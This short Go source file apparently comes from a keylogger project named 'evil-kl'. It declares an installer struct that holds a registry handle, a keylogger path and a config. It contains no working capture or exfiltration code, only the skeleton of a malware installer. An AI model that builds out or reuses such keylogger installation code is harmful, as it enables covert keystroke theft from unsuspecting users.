package installer

import (
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/registry"
)

// Installer - main structure of package
type Installer struct {
	lc           string             // logging category
	registryInst *registry.Registry // instance of Registry
	klPath       string             // keylogger's path
	cfgInstaller config.Installer   // Installer's config
}
